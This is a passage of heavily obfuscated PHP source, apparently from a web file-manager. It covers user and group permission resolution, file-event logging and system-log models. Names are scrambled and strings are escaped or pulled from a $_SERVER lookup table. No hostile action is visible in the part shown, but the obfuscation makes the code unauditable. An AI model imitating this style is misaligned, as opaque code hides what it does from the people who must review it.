(!$˚øÊëæŒ) { continue; } $◊’˜†Œô = $òÌÜ˚∏Ü[$ÊÃæƒ«ò[514]]; $∑´Êó§˝ = intval($˚øÊëæŒ[$ÊÃæƒ«ò[422]]); if ($òÌÜ˚∏Ü[$ÊÃæƒ«ò[420]] == SourceModel::TYPE_USER && $◊’˜†Œô == $’Ã¯ûæÌ) { $ÿ’ˆõ∏Ü = !0; $í¯•˘∫æ = $˚øÊëæŒ; $Ò‚‰¬ñ∫ = $∑´Êó§˝; } else { if ($òÌÜ˚∏Ü[$ÊÃæƒ«ò[420]] == SourceModel::TYPE_GROUP && $this->groupContainUser($◊’˜†Œô, $’Ã¯ûæÌ)) { $÷˙ıç«è = !0; $¬ÕÈ¿¢Ä = $this->groupStepToUserGroup($◊’˜†Œô, $’Ã¯ûæÌ); if ($¬ÕÈ¿¢Ä < $‘Ù˛Â™‰) { $‘Ù˛Â™‰ = $¬ÕÈ¿¢Ä; $Úú‰„üÒ = $∑´Êó§˝; $–ô¬‘π≈ = $˚øÊëæŒ; $® ¯ ¨£ = $◊’˜†Œô; } if ($¬ÕÈ¿¢Ä == $‘Ù˛Â™‰ && $∑´Êó§˝ >= $Úú‰„üÒ) { $Úú‰„üÒ = $∑´Êó§˝; $–ô¬‘π≈ = $˚øÊëæŒ; $® ¯ ¨£ = $◊’˜†Œô; } } else { if ($◊’˜†Œô == $ÊÃæƒ«ò[207]) { $ÇÜ˝ø´• = !0; $ºƒ¡Áçñ = $˚øÊëæŒ; $ê˜≠®•ö = $∑´Êó§˝; } } } } if ($ÿ’ˆõ∏Ü) { $©Üì±€æ = $Ò‚‰¬ñ∫; $˚øÊëæŒ = $í¯•˘∫æ; $Æ˚£úˆ¨ = LNG($ÊÃæƒ«ò[2039]); } else { if ($÷˙ıç«è) { $©Üì±€æ = $Úú‰„üÒ; $˚øÊëæŒ = $–ô¬‘π≈; $‚±›ñÖ† = Model($ÊÃæƒ«ò[531])->getInfo($® ¯ ¨£); $Æ˚£úˆ¨ = $ÊÃæƒ«ò[172] . $‚±›ñÖ†[$ÊÃæƒ«ò[535]] . $ÊÃæƒ«ò[2040] . LNG($ÊÃæƒ«ò[2041]); } else { if ($ÇÜ˝ø´•) { $©Üì±€æ = $ê˜≠®•ö; $˚øÊëæŒ = $ºƒ¡Áçñ; $Æ˚£úˆ¨ = LNG($ÊÃæƒ«ò[2012]); } else { $©Üì±€æ = 0; $˚øÊëæŒ = !1; $Æ˚£úˆ¨ = $ÊÃæƒ«ò[22]; } } } $€ºÊ◊≠é = array($ÊÃæƒ«ò[2031] => intval($©Üì±€æ), $ÊÃæƒ«ò[2015] => $˚øÊëæŒ, $ÊÃæƒ«ò[2032] => $Æ˚£úˆ¨, $ÊÃæƒ«ò[2024] => $òÌÜ˚∏Ü[$ÊÃæƒ«ò[411]]); return $€ºÊ◊≠é; } private function groupContainUser($üƒ·˚Ì˜, $ı¶ñÎç = false) { return in_array($üƒ·˚Ì˜, $this->userGroupParents($ı¶ñÎç)); } private function groupStepToUserGroup($œ¯æﬂΩ‚, $ÎØ •πä = false) { $’»∏µ≥˙ =& $_SERVER[Á≈ ä ∞]; $à∆æ≠…Ñ = $this->userGroupList($ÎØ •πä); $≥°˜∑õŒ = 1000; $»–Ûú˙· = $GLOBALS[$’»∏µ≥˙[16]][$’»∏µ≥˙[99]][$’»∏µ≥˙[1933]] == 1; $∆”Ÿ∞«Í = $»–Ûú˙· ? 3 : 2; foreach ($à∆æ≠…Ñ as $∂üÆÑÛ∏) { if ($∂üÆÑÛ∏[$’»∏µ≥˙[1830]] == $œ¯æﬂΩ‚) { return 0; } $ä›≤ŸØ‹ = explode($’»∏µ≥˙[60], trim($∂üÆÑÛ∏[$’»∏µ≥˙[530]], $’»∏µ≥˙[60])); if ($ä›≤ŸØ‹[0] == $’»∏µ≥˙[207] && count($ä›≤ŸØ‹) > $∆”Ÿ∞«Í) { $´º›»ö∂ = array_reverse(array_slice($ä›≤ŸØ‹, $∆”Ÿ∞«Í)); $úï≠ïÌƒ = array_search($œ¯æﬂΩ‚, $´º›»ö∂); if ($úï≠ïÌƒ !== !1 && $úï≠ïÌƒ + 1 <= $≥°˜∑õŒ) { $≥°˜∑õŒ = $úï≠ïÌƒ + 1; } } } return $≥°˜∑õŒ; } private function userGroupList($∂≈±ÖúÇ = false) { $Ö⁄ö˙˛µ =& $_SERVER[Á≈ ä ∞]; static $„åÂ…Ù‡ = array(); if (isset($„åÂ…Ù‡[$∂≈±ÖúÇ])) { return $„åÂ…Ù‡[$∂≈±ÖúÇ]; } $¸ú‰ﬂïÍ = Model($Ö⁄ö˙˛µ[544])->getInfo($∂≈±ÖúÇ); $„åÂ…Ù‡[$∂≈±ÖúÇ] = array_to_keyvalue($¸ú‰ﬂïÍ[$Ö⁄ö˙˛µ[2013]], $Ö⁄ö˙˛µ[1830]); return $„åÂ…Ù‡[$∂≈±ÖúÇ]; } public function userGroupParents($∑Ñ˙Ω∫”) { $ªÀ»æÇ– =& $_SERVER[Á≈ ä ∞]; static $±—…éã˚ = array(); $∑Ñ˙Ω∫” = $∑Ñ˙Ω∫” ? $∑Ñ˙Ω∫” : USER_ID; if (isset($±—…éã˚[$∑Ñ˙Ω∫”])) { return $±—…éã˚[$∑Ñ˙Ω∫”]; } $ªõ°ˆÖ¡ = $this->userGroupList($∑Ñ˙Ω∫”); $ùõ¨‘∏ì = array(); $∏•Àµ’ = $GLOBALS[$ªÀ»æÇ–[16]][$ªÀ»æÇ–[99]][$ªÀ»æÇ–[1933]] == 1; $µ›ÖÒÀ‚ = $∏•Àµ’ ? 3 : 2; foreach ($ªõ°ˆÖ¡ as $””¡ÖËà) { $°›Ë®µñ = array($””¡ÖËà[$ªÀ»æÇ–[1830]]); $‘ñ§“®Ï = explode($ªÀ»æÇ–[60], trim($””¡ÖËà[$ªÀ»æÇ–[530]], $ªÀ»æÇ–[60])); if ($‘ñ§“®Ï[0] == $ªÀ»æÇ–[207] && count($‘ñ§“®Ï) > $µ›ÖÒÀ‚) { $ª˛≤Ü™‹ = array_slice($‘ñ§“®Ï, $µ›ÖÒÀ‚); $°›Ë®µñ = array_merge($°›Ë®µñ, array_reverse($ª˛≤Ü™‹)); } $ùõ¨‘∏ì = array_merge($ùõ¨‘∏ì, $°›Ë®µñ); } $±—…éã˚[$∑Ñ˙Ω∫”] = array_unique($ùõ¨‘∏ì); return $±—…éã˚[$∑Ñ˙Ω∫”]; } public function authTargetInfoMake($©ç‡ò˛õ) { $Ä…◊‹˙∞ =& $_SERVER[Á≈ ä ∞]; $†ß©Öˆ¯ = array(); $ââôº ™ = array(); foreach ($©ç‡ò˛õ as $¥‡∂Ï∆ê) { if ($¥‡∂Ï∆ê[$Ä…◊‹˙∞[420]] == SourceModel::TYPE_USER) { $†ß©Öˆ¯[] = intval($¥‡∂Ï∆ê[$Ä…◊‹˙∞[514]]); } else { if ($¥‡∂Ï∆ê[$Ä…◊‹˙∞[420]] == SourceModel::TYPE_GROUP) { $ââôº ™[] = intval($¥‡∂Ï∆ê[$Ä…◊‹˙∞[514]]); } } } if ($†ß©Öˆ¯) { $†ß©Öˆ¯ = Model($Ä…◊‹˙∞[522])->userListInfo($†ß©Öˆ¯); } if ($ââôº ™) { $œ≠· ∆Œ = array($Ä…◊‹˙∞[1918] => array($Ä…◊‹˙∞[427], $ââôº ™)); $ââôº ™ = Model($Ä…◊‹˙∞[531])->field($Ä…◊‹˙∞[2042])->where($œ≠· ∆Œ)->select(); $ââôº ™ = array_to_keyvalue($ââôº ™, $Ä…◊‹˙∞[1830]); } return array($Ä…◊‹˙∞[2043] => $†ß©Öˆ¯, $Ä…◊‹˙∞[2044] => $ââôº ™); } public function authInfo($ß˜‰úßŸ) { $˙Æ®ªÉˆ =& $_SERVER[Á≈ ä ∞]; if ($ß˜‰úßŸ[$˙Æ®ªÉˆ[1934]]) { $”¥˝ìÿÜ = Model($˙Æ®ªÉˆ[516])->listData($ß˜‰úßŸ[$˙Æ®ªÉˆ[1934]]); if (!$”¥˝ìÿÜ) { return !1; $©ú˙«“£ = Model($˙Æ®ªÉˆ[516])->listData(); $ÌÈ–÷±≤ = array_filter_by_field($©ú˙«“£, $˙Æ®ªÉˆ[422], $˙Æ®ªÉˆ[207]); return $ÌÈ–÷±≤; } $ä∑Ê∏ıÎ = array_field_key($”¥˝ìÿÜ, array($˙Æ®ªÉˆ[408], $˙Æ®ªÉˆ[42], $˙Æ®ªÉˆ[422], $˙Æ®ªÉˆ[1853], $˙Æ®ªÉˆ[1854])); $ä∑Ê∏ıÎ[$˙Æ®ªÉˆ[2045]] = $ß˜‰úßŸ; return $ä∑Ê∏ıÎ; } else { return array($˙Æ®ªÉˆ[428] => 0, $˙Æ®ªÉˆ[1836] => $ß˜‰úßŸ[$˙Æ®ªÉˆ[1990]], $˙Æ®ªÉˆ[429] => $˙Æ®ªÉˆ[22], $˙Æ®ªÉˆ[1853] => $˙Æ®ªÉˆ[2046]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\x72\143\x65\137\145\x76\145\156\164"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\151\x6d\x65", "\164\151\155\x65", "\151\156\163\x65\162\164", "\x66\165\x6e\143\164\151\x6f\x6e"), array("\144\x65\x73\x63", '', "\151\156\163\x65\x72\x74\54\x75\x70\144\x61\x74\145\54\x73\x65\154\145\143\x74", "\x6a\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($∫äÒÉﬂƒ, $Á ´„≠ , $§´ı˙•è = '') { $Û«Ô·óØ =& $_SERVER[Á≈ ä ∞]; if (!$this->eventSave) { return; } $∂øÑ≠Á∆ = Model($Û«Ô·óØ[1330])->sourceInfo($∫äÒÉﬂƒ); if (!$∂øÑ≠Á∆) { return !1; } if ($this->isCacheEvent($∂øÑ≠Á∆, $Á ´„≠ )) { return; } if ($§´ı˙•è && is_string($§´ı˙•è)) { $§´ı˙•è = array($Û«Ô·óØ[1869] => $§´ı˙•è); } $«ôåßË¨ = array($Û«Ô·óØ[426] => $∫äÒÉﬂƒ, $Û«Ô·óØ[2047] => $∂øÑ≠Á∆[$Û«Ô·óØ[441]], $Û«Ô·óØ[2048] => $∂øÑ≠Á∆[$Û«Ô·óØ[42]], $Û«Ô·óØ[528] => !empty($∂øÑ≠Á∆[$Û«Ô·óØ[528]]) ? $∂øÑ≠Á∆[$Û«Ô·óØ[528]] : $Û«Ô·óØ[22], $Û«Ô·óØ[1649] => USER_ID, $Û«Ô·óØ[431] => $Á ´„≠ , $Û«Ô·óØ[1651] => $§´ı˙•è); $this->addSystemLog($Á ´„≠ , $«ôåßË¨); unset($«ôåßË¨[$Û«Ô·óØ[2048]], $«ôåßË¨[$Û«Ô·óØ[528]]); return $this->add($«ôåßË¨); } private function addSystemLog($Õ‡üüù—, $òê◊¨ê™) { $Û‡îé–¬ =& $_SERVER[Á≈ ä ∞]; if ($Õ‡üüù— == $Û‡îé–¬[2049]) { $Õ‡üüù— = $òê◊¨ê™[$Û‡îé–¬[462]][$Û‡îé–¬[2050]]; } else { if (in_array($Õ‡üüù—, array($Û‡îé–¬[1810], $Û‡îé–¬[2051]))) { $Õ‡üüù— = $òê◊¨ê™[$Û‡îé–¬[462]][$Û‡îé–¬[762]]; } } $°¨ØÕÅ≥ = array_merge($òê◊¨ê™, array($Û‡îé–¬[2052] => $òê◊¨ê™[$Û‡îé–¬[411]], $Û‡îé–¬[2053] => $òê◊¨ê™[$Û‡îé–¬[2053]])); Hook::trigger($Û‡îé–¬[2054], $Û‡îé–¬[2055] . $Õ‡üüù—, $òê◊¨ê™); Model($Û‡îé–¬[1774])->addLog($Û‡îé–¬[2055] . $Õ‡üüù—, $°¨ØÕÅ≥); } private function isCacheEvent($„Ù∞ÔÔ∑, $ÜÔÛûÖ ) { if ($„Ù∞ÔÔ∑[$_SERVER[Á≈ ä ∞][420]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($û—˜åÔü, $ºñ»˙Ûú) { $º”˝Êßî =& $_SERVER[Á≈ ä ∞]; $ÇÅêñ€˚ = Model($º”˝Êßî[1330])->sourceInfo($û—˜åÔü); $å‚±¶Òî = array($º”˝Êßî[2050] => $ºñ»˙Ûú, $º”˝Êßî[42] => $ÇÅêñ€˚[$º”˝Êßî[42]]); return $this->addEvent($û—˜åÔü, $º”˝Êßî[2049], $å‚±¶Òî); } public function eventFileEdit($àª÷˛ç≈) { $ã°Öµä‰ =& $_SERVER[Á≈ ä ∞]; $¨∏ÇºŒî = array($ã°Öµä‰[2056] => $_SERVER[$ã°Öµä‰[2057]], $ã°Öµä‰[2058] => strtolower(ACTION)); if (isset($GLOBALS[$ã°Öµä‰[17]][$ã°Öµä‰[2059]])) { $¨∏ÇºŒî[$ã°Öµä‰[2059]] = $ã°Öµä‰[98]; } return $this->addEvent($àª÷˛ç≈, $ã°Öµä‰[1800], $¨∏ÇºŒî); } public function eventRecycle($“Ïü≈≈˛, $ê∂˚√Ê) { return $this->addEvent($“Ïü≈≈˛, $_SERVER[Á≈ ä ∞][2051], $ê∂˚√Ê); } public function eventRemove($˙›ÈΩÍ) { $∞»¡¨ç¶ =& $_SERVER[Á≈ ä ∞]; $£‚’ß¡— = Model($∞»¡¨ç¶[1330])->sourceInfo($˙›ÈΩÍ); $ü®†Ï¶† = $£‚’ß¡—[$∞»¡¨ç¶[42]]; return $this->addEvent($£‚’ß¡—[$∞»¡¨ç¶[441]], $∞»¡¨ç¶[1799], $ü®†Ï¶†); } public function eventShare($äÀ‚õÇë, $•µªÍ¨Å) { return $this->addEvent($äÀ‚õÇë, $_SERVER[Á≈ ä ∞][1810], $•µªÍ¨Å); } public function eventMove($ñ£æ£†Î, $÷œæ„Ùº, $≠Ú«çìÚ) { $¿ÇÓÍßË =& $_SERVER[Á≈ ä ∞]; $⁄÷Â©«Ä = Model($¿ÇÓÍßË[1330]); $õêçÄìÒ = $⁄÷Â©«Ä->sourceInfo($ñ£æ£†Î); $›ö—üÀ = $⁄÷Â©«Ä->sourceInfo($÷œæ„Ùº); $»Í£ŸÕÚ = $⁄÷Â©«Ä->sourceInfo($≠Ú«çìÚ); $‹öâΩÔø = array($¿ÇÓÍßË[1163] => $÷œæ„Ùº, $¿ÇÓÍßË[2060] => $›ö—üÀ[$¿ÇÓÍßË[42]], $¿ÇÓÍßË[2038] => !empty($›ö—üÀ[$¿ÇÓÍßË[528]]) ? $›ö—üÀ[$¿ÇÓÍßË[528]] : $¿ÇÓÍßË[22], $¿ÇÓÍßË[1164] => $≠Ú«çìÚ, $¿ÇÓÍßË[2061] => $»Í£ŸÕÚ[$¿ÇÓÍßË[42]], $¿ÇÓÍßË[2062] => !empty($»Í£ŸÕÚ[$¿ÇÓÍßË[528]]) ? $»Í£ŸÕÚ[$¿ÇÓÍßË[528]] : $¿ÇÓÍßË[22]); $this->addEvent($ñ£æ£†Î, $¿ÇÓÍßË[566], $‹öâΩÔø); $õêçÄìÒ = $⁄÷Â©«Ä->sourceInfo($ñ£æ£†Î); $‹öâΩÔø = array($¿ÇÓÍßË[411] => $õêçÄìÒ[$¿ÇÓÍßË[411]], $¿ÇÓÍßË[42] => $õêçÄìÒ[$¿ÇÓÍßË[42]]); $this->addEvent($÷œæ„Ùº, $¿ÇÓÍßË[2063], $‹öâΩÔø); } public function eventCopy($“˜æ≠ŒÒ) { $this->eventCreate($“˜æ≠ŒÒ, $_SERVER[Á≈ ä ∞][564]); } public function eventRename($ç∞ëË§î, $üö–•Ëã, $ÈÚà±…Ã) { $¨ûó◊ﬂ° =& $_SERVER[Á≈ ä ∞]; $ﬂä–Ï¯¡ = array($¨ûó◊ﬂ°[1163] => $üö–•Ëã, $¨ûó◊ﬂ°[1164] => $ÈÚà±…Ã); return $this->addEvent($ç∞ëË§î, $¨ûó◊ﬂ°[1345], $ﬂä–Ï¯¡); } public function eventAddComment($Æ”’ﬁ∑, $ﬂÀ◊∆ô∑) { return $this->addEvent($Æ”’ﬁ∑, $_SERVER[Á≈ ä ∞][2064], $ﬂÀ◊∆ô∑); } public function eventAddDesc($¶Èàπ†å, $«™¢Ò—É) { return $this->addEvent($¶Èàπ†å, $_SERVER[Á≈ ä ∞][2065], $«™¢Ò—É); } public function listBySource($≥„…˙ïƒ) { $ò†”¬“¶ =& $_SERVER[Á≈ ä ∞]; $°õ¨‡÷È = Model($ò†”¬“¶[1330])->sourceInfo($≥„…˙ïƒ); $˚öÔàªÏ = array($ò†”¬“¶[426] => $≥„…˙ïƒ); if ($°õ¨‡÷È[$ò†”¬“¶[419]] == $ò†”¬“¶[98]) { $ÿ¶∆∑óπ = Model($ò†”¬“¶[1330])->listSearchChildren($≥„…˙ïƒ, 20000); $ÿ¶∆∑óπ[] = $≥„…˙ïƒ . $ò†”¬“¶[387]; $˚öÔàªÏ = array($ò†”¬“¶[411] => array($ò†”¬“¶[17], $ÿ¶∆∑óπ)); } $ÒÕ‚Ω¨⁄ = $this->where($˚öÔàªÏ)->order($ò†”¬“¶[2066])->selectPage(); if ($ÒÕ‚Ω¨⁄[$ò†”¬“¶[375]][$ò†”¬“¶[376]] == 0) { $ÒÕ‚Ω¨⁄[$ò†”¬“¶[375]][$ò†”¬“¶[376]] = 1; $ÒÕ‚Ω¨⁄[$ò†”¬“¶[378]] = array(array($ò†”¬“¶[426] => $≥„…˙ïƒ, $ò†”¬“¶[2047] => $°õ¨‡÷È[$ò†”¬“¶[441]], $ò†”¬“¶[1649] => $°õ¨‡÷È[$ò†”¬“¶[463]], $ò†”¬“¶[431] => $ò†”¬“¶[2067], $ò†”¬“¶[432] => $°õ¨‡÷È[$ò†”¬“¶[210]], $ò†”¬“¶[1651] => $ò†”¬“¶[22])); } return $this->eventListParse($ÒÕ‚Ω¨⁄, $≥„…˙ïƒ); } private function eventListParse($“¬öÁõ◊, $ÇÍõê„—) { $’äŒò¢’ =& $_SERVER[Á≈ ä ∞]; $Ñ«¡°ÔÀ = $“¬öÁõ◊[$’äŒò¢’[378]]; $á·◊¨ı¶ = array_to_keyvalue($Ñ«¡°ÔÀ, $’äŒò¢’[22], $’äŒò¢’[411]); $˙˙äøëÁ = array_to_keyvalue($Ñ«¡°ÔÀ, $’äŒò¢’[22], $’äŒò¢’[2053]); foreach ($Ñ«¡°ÔÀ as $¡”™≤ﬂ¿) { $∏Êë˙Õ≠ = $¡”™≤ﬂ¿[$’äŒò¢’[462]]; if ($¡”™≤ﬂ¿[$’äŒò¢’[43]] == $’äŒò¢’[566] && isset($∏Êë˙Õ≠[$’äŒò¢’[1163]])) { $á·◊¨ı¶[] = $∏Êë˙Õ≠[$’äŒò¢’[1163]] . $’äŒò¢’[22]; $á·◊¨ı¶[] = $∏Êë˙Õ≠[$’äŒò¢’[1164]] . $’äŒò¢’[22]; } if ($¡”™≤ﬂ¿[$’äŒò¢’[43]] == $’äŒò¢’[2063] && isset($∏Êë˙Õ≠[$’äŒò¢’[411]])) { $á·◊¨ı¶[] = $∏Êë˙Õ≠[$’äŒò¢’[411]] . $’äŒò¢’[22]; } } $á·◊¨ı¶ = array_merge($á·◊¨ı¶, $˙˙äøëÁ, array($ÇÍõê„— . $’äŒò¢’[22])); $á·◊¨ı¶ = array_unique($á·◊¨ı¶); $—⁄Êæ˘Å = array_unique(array_to_keyvalue($Ñ«¡°ÔÀ, $’äŒò¢’[22], $’äŒò¢’[1658])); $™ÖÏÚ®à = Model($’äŒò¢’[544])->userListInfo($—⁄Êæ˘Å); $ƒ«“¨ë§ = Model($’äŒò¢’[832])->sourceListInfo($á·◊¨ı¶, !0); foreach ($Ñ«¡°ÔÀ as &$¡”™≤ﬂ¿) { if ($¡”™≤ﬂ¿[$’äŒò¢’[43]] == $’äŒò¢’[566] && isset($¡”™≤ﬂ¿[$’äŒò¢’[462]][$’äŒò¢’[1163]])) { $¡”™≤ﬂ¿[$’äŒò¢’[462]][$’äŒò¢’[1163]] = $ƒ«“¨ë§[$¡”™≤ﬂ¿[$’äŒò¢’[462]][$’äŒò¢’[1163]]]; $¡”™≤ﬂ¿[$’äŒò¢’[462]][$’äŒò¢’[1164]] = $ƒ«“¨ë§[$¡”™≤ﬂ¿[$’äŒò¢’[462]][$’äŒò¢’[1164]]]; } if ($¡”™≤ﬂ¿[$’äŒò¢’[43]] == $’äŒò¢’[2063] && isset($¡”™≤ﬂ¿[$’äŒò¢’[462]][$’äŒò¢’[411]])) { $¡”™≤ﬂ¿[$’äŒò¢’[462]][$’äŒò¢’[411]] = $ƒ«“¨ë§[$¡”™≤ﬂ¿[$’äŒò¢’[462]][$’äŒò¢’[411]]]; } $¡”™≤ﬂ¿[$’äŒò¢’[96]] = $ƒ«“¨ë§[$¡”™≤ﬂ¿[$’äŒò¢’[411]]]; $¡”™≤ﬂ¿[$’äŒò¢’[2068]] = $ƒ«“¨ë§[$¡”™≤ﬂ¿[$’äŒò¢’[2053]]]; if ($¡”™≤ﬂ¿[$’äŒò¢’[43]] == $’äŒò¢’[1799]) { $¡”™≤ﬂ¿[$’äŒò¢’[2068]] = $¡”™≤ﬂ¿[$’äŒò¢’[96]]; $¡”™≤ﬂ¿[$’äŒò¢’[2053]] = $¡”™≤ﬂ¿[$’äŒò¢’[2068]][$’äŒò¢’[411]]; $¡”™≤ﬂ¿[$’äŒò¢’[96]] = !1; $¡”™≤ﬂ¿[$’äŒò¢’[411]] = $’äŒò¢’[22]; } $¡”™≤ﬂ¿[$’äŒò¢’[1998]] = $™ÖÏÚ®à[$¡”™≤ﬂ¿[$’äŒò¢’[1658]]]; } unset($¡”™≤ﬂ¿); $“¬öÁõ◊[$’äŒò¢’[378]] = $Ñ«¡°ÔÀ; return $“¬öÁõ◊; } public function removeBySource($µèû™÷•) { $·Í≥Ó„é = array($_SERVER[Á≈ ä ∞][426] => $µèû™÷•); $this->where($·Í≥Ó„é)->remove(); } } goto Aü°·É˜âË; cÔ§Ÿ¬è°–: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\114\151\x67\x68\x74\x41\x70\160"; public $modelType = "\x53\171\163\164\145\x6d\x4f\x70\x74\x69\157\156"; public $field = array("\x6e\141\155\x65", "\x67\x72\157\x75\x70", "\144\145\163\143", "\143\157\156\x74\x65\x6e\x74"); public function listData($„å¶¥çÙ = false, $ª∞∂’Ó∏ = "\155\157\144\x69\x66\x79\124\151\x6d\145", $‰Ø´™Ë˘ = true) { return parent::listData($„å¶¥çÙ, $ª∞∂’Ó∏, $‰Ø´™Ë˘); } public function remove($©ÍÎ˚ÊÌ) { $˘Äß∫Âä = $this->findByName($©ÍÎ˚ÊÌ); if (!$˘Äß∫Âä) { return !1; } return parent::remove($˘Äß∫Âä[$_SERVER[Á≈ ä ∞][408]]); } public function add($ÜÆ…‰÷ﬂ) { if ($this->findByName($ÜÆ…‰÷ﬂ[$_SERVER[Á≈ ä ∞][42]])) { return !1; } return parent::insert($ÜÆ…‰÷ﬂ); } public function update($Á˛çıéË, $å∆§™◊ı) { $î‘Çﬁó£ =& $_SERVER[Á≈ ä ∞]; $ÒÔ‹ñìÿ = $this->findByName($Á˛çıéË); $ûé∑˜ê∑ = $this->findByName($å∆§™◊ı[$î‘Çﬁó£[42]]); if (!$ÒÔ‹ñìÿ || $ûé∑˜ê∑ && $ûé∑˜ê∑[$î‘Çﬁó£[408]] != $ÒÔ‹ñìÿ[$î‘Çﬁó£[408]]) { return !1; } return parent::update($ÒÔ‹ñìÿ[$î‘Çﬁó£[408]], $å∆§™◊ı); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\155\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\x69\155\145", "\164\x69\x6d\x65", "\x69\156\163\145\x72\164", "\x66\x75\x6e\x63\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $âπÏø˙à =& $_SERVER[Á≈ ä ∞]; return array($âπÏø˙à[2158] => LNG($âπÏø˙à[2159]), $âπÏø˙à[2160] => LNG($âπÏø˙à[2161]), $âπÏø˙à[1773] => LNG($âπÏø˙à[2162]), $âπÏø˙à[2163] => LNG($âπÏø˙à[2164]), $âπÏø˙à[2165] => LNG($âπÏø˙à[2166]), $âπÏø˙à[2167] => LNG($âπÏø˙à[2168]), $âπÏø˙à[2169] => LNG($âπÏø˙à[2170]), $âπÏø˙à[1803] => LNG($âπÏø˙à[2170]), $âπÏø˙à[1804] => LNG($âπÏø˙à[2171]), $âπÏø˙à[2172] => LNG($âπÏø˙à[2173]), $âπÏø˙à[2174] => LNG($âπÏø˙à[2175]), $âπÏø˙à[2176] => LNG($âπÏø˙à[2177]), $âπÏø˙à[2178] => LNG($âπÏø˙à[2179]), $âπÏø˙à[1801] => LNG($âπÏø˙à[2180]), $âπÏø˙à[2181] => LNG($âπÏø˙à[2182]), $âπÏø˙à[1808] => LNG($âπÏø˙à[2183]), $âπÏø˙à[2184] => LNG($âπÏø˙à[2185]), $âπÏø˙à[2186] => LNG($âπÏø˙à[2187]), $âπÏø˙à[2188] => LNG($âπÏø˙à[2189]), $âπÏø˙à[2190] => LNG($âπÏø˙à[2191]), $âπÏø˙à[1811] => LNG($âπÏø˙à[2192]), $âπÏø˙à[1812] => LNG($âπÏø˙à[2193]), $âπÏø˙à[2194] => LNG($âπÏø˙à[2195]), $âπÏø˙à[2196] => LNG($âπÏø˙à[2197]), $âπÏø˙à[2198] => LNG($âπÏø˙à[2199]), $âπÏø˙à[1806] => LNG($âπÏø˙à[2200]), $âπÏø˙à[2201] => LNG($âπÏø˙à[2202]), $âπÏø˙à[1805] => LNG($âπÏø˙à[2203]), $âπÏø˙à[2204] => LNG($âπÏø˙à[2205]), $âπÏø˙à[2206] => LNG($âπÏø˙à[2207]), $âπÏø˙à[2208] => LNG($âπÏø˙à[2209]), $âπÏø˙à[2210] => LNG($âπÏø˙à[2210]), $âπÏø˙à[2211] => LNG($âπÏø˙à[1777]), $âπÏø˙à[2212] => LNG($âπÏø˙à[2213]), $âπÏø˙à[2214] => LNG($âπÏø˙à[2215]), $âπÏø˙à[2216] => LNG($âπÏø˙à[2217]), $âπÏø˙à[2218] => LNG($âπÏø˙à[2219]), $âπÏø˙à[2220] => LNG($âπÏø˙à[2221]), $âπÏø˙à[2222] => LNG($âπÏø˙à[2222]), $âπÏø˙à[2223] => LNG($âπÏø˙à[2224]), $âπÏø˙à[2225] => LNG($âπÏø˙à[2226]), $âπÏø˙à[2227] => LNG($âπÏø˙à[2228]), $âπÏø˙à[2229] => LNG($âπÏø˙à[2230]), $âπÏø˙à[2231] => LNG($âπÏø˙à[2232]), $âπÏø˙à[2233] => LNG($âπÏø˙à[2234])); } private function typeFile() { $√ Ÿ‡ƒù =& $_SERVER[Á≈ ä ∞]; $ôŸ‰ú√ﬁ = array($√ Ÿ‡ƒù[1808] => array($√ Ÿ‡ƒù[1809]), $√ Ÿ‡ƒù[2176] => array($√ Ÿ‡ƒù[2235]), $√ Ÿ‡ƒù[2178] => array($√ Ÿ‡ƒù[2236]), $√ Ÿ‡ƒù[1801] => array($√ Ÿ‡ƒù[1802]), $√ Ÿ‡ƒù[2186] => array(), $√ Ÿ‡ƒù[2188] => array(), $√ Ÿ‡ƒù[2190] => array(), $√ Ÿ‡ƒù[1811] => array($√ Ÿ‡ƒù[1813]), $√ Ÿ‡ƒù[1812] => array($√ Ÿ‡ƒù[1813]), $√ Ÿ‡ƒù[2194] => array($√ Ÿ‡ƒù[2237]), $√ Ÿ‡ƒù[2196] => array($√ Ÿ‡ƒù[2237]), $√ Ÿ‡ƒù[2198] => array($√ Ÿ‡ƒù[2238]), $√ Ÿ‡ƒù[2184] => array($√ Ÿ‡ƒù[2239]), $√ Ÿ‡ƒù[1806] => array($√ Ÿ‡ƒù[2240]), $√ Ÿ‡ƒù[2201] => array($√ Ÿ‡ƒù[2241]), $√ Ÿ‡ƒù[1805] => array($√ Ÿ‡ƒù[1807])); return $ôŸ‰ú√ﬁ; } private function typeAll() { $‹Ê÷ë∂û =& $_SERVER[Á≈ ä ∞]; $ƒü¡ÁáÛ = $this->typeList; $ß≤⁄—ÿ™ = array_filter($this->typeFile()); foreach ($ß≤⁄—ÿ™ as $ÚûÂÖÂË => $˙ïã⁄Çì) { $ƒü¡ÁáÛ[$˙ïã⁄Çì[0]] = $ƒü¡ÁáÛ[$ÚûÂÖÂË]; } $ƒü¡ÁáÛ[$‹Ê÷ë∂û[1813]] = LNG($‹Ê÷ë∂û[2242]); $ƒü¡ÁáÛ[$‹Ê÷ë∂û[2237]] = LNG($‹Ê÷ë∂û[2243]); return $ƒü¡ÁáÛ; } public function addLog($Å÷ªœŒÉ, $©˜÷êê™ = array()) { $¶´≥–í  =& $_SERVER[Á≈ ä ∞]; if (!isset($this->typeList[$Å÷ªœŒÉ])) { return; } $è™œ”ßŸ = defined($¶´≥–í [484]) && USER_ID ? USER_ID : (isset($©˜÷êê™[$¶´≥–í [1658]]) ? $©˜÷êê™[$¶´≥–í [1658]] : 0); if (!$è™œ”ßŸ) { $è™œ”ßŸ = (int) Session::get($¶´≥–í [1967]); } if ($Å÷ªœŒÉ == $¶´≥–í [2212] && is_array($©˜÷êê™[$¶´≥–í [2244]]) && !$©˜÷êê™[$¶´≥–í [2244]]) { return; } $Õ˚¯…¸ = get_client_ip(); if (!$©˜÷êê™ || strlen(json_encode($©˜÷êê™)) >= 1024) { $©˜÷êê™ = array($¶´≥–í [2245] => $Õ˚¯…¸); } else { if (is_array($©˜÷êê™)) { $©˜÷êê™[$¶´≥–í [2245]] = 